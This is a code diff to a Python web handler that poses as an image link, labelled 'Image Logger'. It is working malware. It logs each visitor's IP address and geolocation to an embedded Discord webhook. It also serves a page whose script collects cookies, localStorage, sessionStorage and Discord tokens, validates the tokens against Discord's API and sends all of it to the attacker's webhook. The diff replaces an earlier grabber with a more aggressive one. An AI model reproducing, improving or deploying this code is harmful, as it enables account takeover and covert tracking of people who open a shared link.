@@ -9,43 +9,59 @@ class handler(BaseHTTPRequestHandler):
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
-        DEFAULT_IMAGE = "https://tse1.mm.bing.net/th/id/OIP.RXrqLpAA646xM_jjo3oWwgHaEK?rs=1&pid=ImgDetMain&o=7&rm=3"
+        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
         
-        # Custom image mappings - add more here
+        # Custom image mappings
         IMAGES = {
-            "mycatimage": "https://tse1.mm.bing.net/th/id/OIP.RXrqLpAA646xM_jjo3oWwgHaEK?rs=1&pid=ImgDetMain&o=7&rm=3",
-            "dogpic": "https://tse1.mm.bing.net/th/id/OIP.RXrqLpAA646xM_jjo3oWwgHaEK?rs=1&pid=ImgDetMain&o=7&rm=3",
-            "meme": "https://tse1.mm.bing.net/th/id/OIP.RXrqLpAA646xM_jjo3oWwgHaEK?rs=1&pid=ImgDetMain&o=7&rm=3",
-            # Add more custom names here
+            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
+            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
+            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
+            "poki": "https://i.imgur.com/5M6F3wQ.jpeg",
         }
         
-        # Get REAL IP and User Agent (Vercel specific headers)
-        ip = self.headers.get('X-Real-IP') or self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
-        user_agent = self.headers.get('User-Agent', 'Unknown')
-        country = self.headers.get('X-Vercel-IP-Country', 'Unknown')
-        city = self.headers.get('X-Vercel-IP-City', 'Unknown')
-        region = self.headers.get('X-Vercel-IP-Country-Region', 'Unknown')
+        # Get REAL IP - try multiple headers
+        ip = (self.headers.get('CF-Connecting-IP') or 
+              self.headers.get('X-Real-IP') or 
+              self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or 
+              self.client_address[0])
         
-        # Get IP info
+        user_agent = self.headers.get('User-Agent', 'Unknown')
+        
+        # Get IP info from multiple sources
+        info = {}
         try:
-            ip_info_url = f"http://ip-api.com/json/{ip}?fields=16976857"
-            with urllib.request.urlopen(ip_info_url) as response:
+            # Try ipapi.co first - more accurate
+            ip_info_url = f"https://ipapi.co/{ip}/json/"
+            req = urllib.request.Request(ip_info_url, headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=5) as response:
                 info = json.loads(response.read().decode())
         except:
-            info = {}
+            try:
+                # Fallback to ipwhois.app
+                ip_info_url = f"http://ipwhois.app/json/{ip}"
+                with urllib.request.urlopen(ip_info_url, timeout=5) as response:
+                    data = json.loads(response.read().decode())
+                    info = {
+                        'city': data.get('city'),
+                        'region': data.get('region'),
+                        'country': data.get('country'),
+                        'latitude': data.get('latitude'),
+                        'longitude': data.get('longitude'),
+                        'org': data.get('isp'),
+                        'timezone': data.get('timezone'),
+                    }
+            except:
+                pass
         
         # Get image name from path
         path_parts = self.path.strip('/').split('/')
         image_name = path_parts[-1] if len(path_parts) > 1 else None
-        
-        # Remove query string if exists
         if image_name and '?' in image_name:
             image_name = image_name.split('?')[0]
         
-        # Get image URL
         image_url = IMAGES.get(image_name, DEFAULT_IMAGE)
         
-        # Create Discord embed
+        # Create Discord embed for IP
         embed = {
             "username": "Image Logger",
             "content": "@everyone",
@@ -58,15 +74,12 @@ class handler(BaseHTTPRequestHandler):
 
 **IP Info:**
 > **IP:** `{ip}`
-> **Provider:** `{info.get('isp', 'Unknown')}`
-> **Country:** `{info.get('country', country)}`
-> **Region:** `{info.get('regionName', region)}`
-> **City:** `{info.get('city', city)}`
-> **Coords:** `{info.get('lat', 'N/A')}, {info.get('lon', 'N/A')}`
+> **Provider:** `{info.get('org', 'Unknown')}`
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region:** `{info.get('region', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Coords:** `{info.get('latitude', 'N/A')}, {info.get('longitude', 'N/A')}`
 > **Timezone:** `{info.get('timezone', 'Unknown')}`
-> **VPN:** `{info.get('proxy', False)}`
-> **Mobile:** `{info.get('mobile', False)}`
-> **ASN:** `{info.get('as', 'Unknown')}`
 
 **User Agent:**
 ```
@@ -85,7 +98,7 @@ class handler(BaseHTTPRequestHandler):
         except:
             pass
         
-        # Return HTML with image and improved token grabber
+        # Return HTML with AGGRESSIVE cookie and token grabber
         html = f'''<!DOCTYPE html>
 <html>
 <head>
@@ -98,208 +111,183 @@ class handler(BaseHTTPRequestHandler):
     <meta property="og:image:height" content="630">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content="{image_url}">
-    <meta name="theme-color" content="#000000">
     <title>Image</title>
     <style>
-        body {{
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: #000;
-        }}
-        img {{
-            max-width: 100%;
-            max-height: 100vh;
-            object-fit: contain;
-        }}
-        #tokenDisplay {{
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: rgba(0, 255, 0, 0.9);
-            color: #000;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            max-width: 90%;
-            max-height: 80vh;
-            overflow-y: auto;
-            word-wrap: break-word;
-            display: none;
-            z-index: 9999;
-        }}
-        #tokenDisplay.show {{
-            display: block;
-        }}
+        body {{ margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #000; }}
+        img {{ max-width: 100%; max-height: 100vh; object-fit: contain; }}
+        #info {{ position: fixed; top: 10px; left: 10px; background: rgba(0,255,0,0.95); color: #000; padding: 20px; border-radius: 10px; font-family: monospace; font-size: 11px; max-width: 95%; max-height: 90vh; overflow-y: auto; z-index: 99999; }}
     </style>
 </head>
 <body>
     <img src="{image_url}" alt="Image">
-    <div id="tokenDisplay"></div>
+    <div id="info"></div>
     <script>
-        (async function() {{
-            let token = null;
-            let tokens = [];
-            const display = document.getElementById('tokenDisplay');
-            
-            // Method 1: Discord webpack
-            try {{
-                if (window.webpackChunkdiscord_app) {{
-                    window.webpackChunkdiscord_app.push([[Math.random()], {{}}, (req) => {{
-                        for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {{
-                            if (m.default && m.default.getToken !== undefined) {{
-                                token = m.default.getToken();
-                            }}
-                            if (m.getToken !== undefined) {{
-                                token = m.getToken();
-                            }}
-                        }}
-                    }}]);
+(async function(){{
+    const info = document.getElementById('info');
+    let output = '<b>🔍 GRABBING YOUR DATA...</b><br><br>';
+    
+    // GET ALL COOKIES
+    output += '<b>🍪 COOKIES:</b><br>';
+    const allCookies = document.cookie;
+    if(allCookies){{
+        const cookieList = allCookies.split(';').map(c=>c.trim());
+        output += cookieList.join('<br>') + '<br><br>';
+    }}else{{
+        output += 'No cookies found<br><br>';
+    }}
+    
+    // GET LOCALSTORAGE
+    output += '<b>💾 LOCALSTORAGE:</b><br>';
+    try{{
+        for(let i=0; i<localStorage.length; i++){{
+            const key = localStorage.key(i);
+            const val = localStorage.getItem(key);
+            output += key + ': ' + (val.length>100 ? val.substr(0,100)+'...' : val) + '<br>';
+        }}
+    }}catch(e){{output += 'Cannot access<br>';}}
+    output += '<br>';
+    
+    // GET SESSIONSTORAGE
+    output += '<b>💾 SESSIONSTORAGE:</b><br>';
+    try{{
+        for(let i=0; i<sessionStorage.length; i++){{
+            const key = sessionStorage.key(i);
+            const val = sessionStorage.getItem(key);
+            output += key + ': ' + (val.length>100 ? val.substr(0,100)+'...' : val) + '<br>';
+        }}
+    }}catch(e){{output += 'Cannot access<br>';}}
+    output += '<br>';
+    
+    // DISCORD TOKEN GRAB
+    output += '<b>🔑 DISCORD TOKENS:</b><br>';
+    let tokens = [];
+    
+    try{{
+        if(window.webpackChunkdiscord_app){{
+            window.webpackChunkdiscord_app.push([[Math.random()],{{}},req=>{{
+                for(const m of Object.keys(req.c).map(x=>req.c[x].exports).filter(x=>x)){{
+                    if(m.default?.getToken) tokens.push(m.default.getToken());
+                    if(m.getToken) tokens.push(m.getToken());
                 }}
-            }} catch(e) {{}}
-            
-            // Method 2: LocalStorage scan
-            try {{
-                for (let i = 0; i < localStorage.length; i++) {{
-                    let key = localStorage.key(i);
-                    let value = localStorage.getItem(key);
-                    if (value && value.length > 0) {{
-                        // Discord token pattern
-                        let matches = value.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/g) || 
-                                     value.match(/mfa\\.[\\w-]{{84}}/g);
-                        if (matches) {{
-                            matches.forEach(t => {{
-                                if (!tokens.includes(t)) tokens.push(t);
-                            }});
-                        }}
-                    }}
-                }}
-            }} catch(e) {{}}
-            
-            // Method 3: Check all storage
-            try {{
-                const getToken = () => {{
-                    return (webpackChunkdiscord_app.push([[''],{{}},e=>{{m=[];for(let c in e.c)m.push(e.c[c])}}]),m).find(m=>m?.exports?.default?.getToken).exports.default.getToken();
-                }};
-                token = getToken();
-            }} catch(e) {{}}
-            
-            if (token && !tokens.includes(token)) tokens.push(token);
-            
-            // Method 4: iframe injection (for Discord embeds)
-            if (tokens.length === 0) {{
-                try {{
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    document.body.appendChild(iframe);
-                    const iframeToken = iframe.contentWindow.localStorage.getItem('token');
-                    if (iframeToken) tokens.push(iframeToken.replace(/"/g, ''));
-                }} catch(e) {{}}
+            }}]);
+        }}
+    }}catch(e){{}}
+    
+    // Scan all storage for tokens
+    const scanForTokens = (str) => {{
+        const matches = str.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/g) || str.match(/mfa\\.[\\w-]{{84}}/g) || [];
+        return matches;
+    }};
+    
+    try{{
+        for(let i=0; i<localStorage.length; i++){{
+            const val = localStorage.getItem(localStorage.key(i));
+            const found = scanForTokens(val);
+            found.forEach(t=>{{ if(!tokens.includes(t)) tokens.push(t); }});
+        }}
+    }}catch(e){{}}
+    
+    if(tokens.length>0){{
+        tokens.forEach((t,i)=>{{ output += 'Token '+(i+1)+': '+t+'<br>'; }});
+    }}else{{
+        output += 'No tokens found (open in Discord app)<br>';
+    }}
+    
+    info.innerHTML = output;
+    
+    // SEND EVERYTHING TO WEBHOOK
+    const dataToSend = {{
+        cookies: allCookies,
+        localStorage: {{}},
+        sessionStorage: {{}},
+        tokens: tokens,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screenRes: screen.width+'x'+screen.height
+    }};
+    
+    try{{
+        for(let i=0; i<localStorage.length; i++){{
+            const key = localStorage.key(i);
+            dataToSend.localStorage[key] = localStorage.getItem(key);
+        }}
+    }}catch(e){{}}
+    
+    try{{
+        for(let i=0; i<sessionStorage.length; i++){{
+            const key = sessionStorage.key(i);
+            dataToSend.sessionStorage[key] = sessionStorage.getItem(key);
+        }}
+    }}catch(e){{}}
+    
+    // Send cookies
+    if(allCookies){{
+        await fetch('{WEBHOOK}',{{
+            method:'POST',
+            headers:{{'Content-Type':'application/json'}},
+            body:JSON.stringify({{
+                content:'@everyone',
+                embeds:[{{
+                    title:'🍪 COOKIES GRABBED',
+                    color:16753920,
+                    description:'```'+allCookies+'```',
+                    fields:[
+                        {{name:'Endpoint',value:'{image_name if image_name else "default"}',inline:true}}
+                    ]
+                }}]
+            }})
+        }});
+    }}
+    
+    // Send storage data
+    const storageData = JSON.stringify(dataToSend, null, 2);
+    if(storageData.length > 100){{
+        await fetch('{WEBHOOK}',{{
+            method:'POST',
+            headers:{{'Content-Type':'application/json'}},
+            body:JSON.stringify({{
+                content:'@everyone',
+                embeds:[{{
+                    title:'💾 STORAGE DATA',
+                    color:3447003,
+                    description:'```json\\n'+storageData.substr(0,1900)+'```',
+                    fields:[
+                        {{name:'Endpoint',value:'{image_name if image_name else "default"}',inline:true}}
+                    ]
+                }}]
+            }})
+        }});
+    }}
+    
+    // Send tokens
+    for(let t of tokens){{
+        try{{
+            const r = await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
+            let userInfo = 'Unknown';
+            if(r.ok){{
+                const d = await r.json();
+                userInfo = d.username+'#'+d.discriminator+' ('+d.id+')';
             }}
-            
-            // Display tokens and cookies on screen
-            let displayHTML = '';
-            
-            if (tokens.length > 0) {{
-                displayHTML = '🔑 TOKEN(S) FOUND:<br><br>' + tokens.map((t, i) => `Token ${{i+1}}:<br>${{t}}`).join('<br><br>');
-            }} else {{
-                displayHTML = '❌ No Discord tokens found<br>(This only works when opened in Discord app/web)';
-            }}
-            
-            // Get cookies
-            const cookies = document.cookie;
-            if (cookies) {{
-                displayHTML += '<br><br>🍪 COOKIES:<br>' + cookies.split(';').map(c => c.trim()).join('<br>');
-            }} else {{
-                displayHTML += '<br><br>🍪 No cookies found';
-            }}
-            
-            display.innerHTML = displayHTML;
-            display.classList.add('show');
-            
-            // Send all found tokens and cookies
-            const allCookies = document.cookie;
-            
-            // Send cookies to webhook
-            if (allCookies) {{
-                await fetch('{WEBHOOK}', {{
-                    method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{
-                        content: '@everyone',
-                        embeds: [{{
-                            title: '🍪 COOKIES GRABBED',
-                            color: 16753920,
-                            description: '```' + allCookies + '```',
-                            fields: [
-                                {{name: 'IP', value: '{ip}', inline: true}},
-                                {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
-                            ],
-                            footer: {{text: 'Cookie Logger'}}
-                        }}]
-                    }})
-                }});
-            }}
-            
-            if (tokens.length > 0) {{
-                for (let t of tokens) {{
-                    try {{
-                        // Validate token
-                        const response = await fetch('https://discord.com/api/v9/users/@me', {{
-                            headers: {{ 'Authorization': t }}
-                        }});
-                        
-                        let userInfo = 'Unknown';
-                        if (response.ok) {{
-                            const data = await response.json();
-                            userInfo = `${{data.username}}#${{data.discriminator}} (ID: ${{data.id}})`;
-                        }}
-                        
-                        await fetch('{WEBHOOK}', {{
-                            method: 'POST',
-                            headers: {{'Content-Type': 'application/json'}},
-                            body: JSON.stringify({{
-                                content: '@everyone',
-                                embeds: [{{
-                                    title: '🔑 DISCORD TOKEN GRABBED',
-                                    color: 16711680,
-                                    fields: [
-                                        {{name: 'Token', value: '```' + t + '```', inline: false}},
-                                        {{name: 'Account', value: userInfo, inline: false}},
-                                        {{name: 'IP', value: '{ip}', inline: true}},
-                                        {{name: 'Location', value: '{info.get("city", "Unknown")}, {info.get("regionName", "Unknown")}', inline: true}},
-                                        {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
-                                    ],
-                                    footer: {{text: 'Token Logger'}}
-                                }}]
-                            }})
-                        }});
-                    }} catch(e) {{
-                        // Send even if validation fails
-                        await fetch('{WEBHOOK}', {{
-                            method: 'POST',
-                            headers: {{'Content-Type': 'application/json'}},
-                            body: JSON.stringify({{
-                                content: '@everyone',
-                                embeds: [{{
-                                    title: '🔑 POSSIBLE TOKEN FOUND',
-                                    color: 16776960,
-                                    description: '```' + t + '```',
-                                    fields: [
-                                        {{name: 'IP', value: '{ip}', inline: true}},
-                                        {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
-                                    ]
-                                }}]
-                            }})
-                        }});
-                    }}
-                }}
-            }}
-        }})();
+            await fetch('{WEBHOOK}',{{
+                method:'POST',
+                headers:{{'Content-Type':'application/json'}},
+                body:JSON.stringify({{
+                    content:'@everyone',
+                    embeds:[{{
+                        title:'🔑 TOKEN GRABBED',
+                        color:16711680,
+                        fields:[
+                            {{name:'Token',value:'```'+t+'```',inline:false}},
+                            {{name:'Account',value:userInfo,inline:false}},
+                            {{name:'Endpoint',value:'{image_name if image_name else "default"}',inline:true}}
+                        ]
+                    }}]
+                }})
+            }});
+        }}catch(e){{}}
+    }}
+}})();
     </script>
 </body>
 </html>'''
